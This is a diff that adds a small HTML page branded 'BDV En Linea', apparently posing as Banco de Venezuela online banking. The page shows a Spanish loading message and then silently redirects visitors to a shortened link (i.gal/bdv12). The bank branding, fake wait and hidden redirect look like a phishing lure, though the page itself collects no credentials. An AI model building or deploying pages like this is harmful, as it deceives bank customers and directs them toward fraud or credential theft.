@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BDV En Linea</title>
+  <!-- Incluir Velocity.js -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/velocity/2.0.5/velocity.min.js"></script>
+</head>
+<body>
+  <div id="loading">
+    <p>Estamos trabajando para ti. Espera mientras cargamos tu información...</p>
+  </div>
+
+  <script>
+    // Esperar a que el DOM esté completamente cargado
+    document.addEventListener("DOMContentLoaded", function() {
+      // Obtener el elemento de carga
+      var loadingDiv = document.getElementById("loading");
+      
+      // Animación con Velocity.js
+      Velocity(loadingDiv, { opacity: 1 }, { duration: 1000, delay: 1000 });
+      Velocity(loadingDiv, { opacity: 0 }, { duration: 1000, delay: 14000, complete: function() {
+        // Redireccionar después de la animación
+        window.location.href = "https://i.gal/bdv12";
+      }});
+    });
+  </script>
+</body>
+</html>
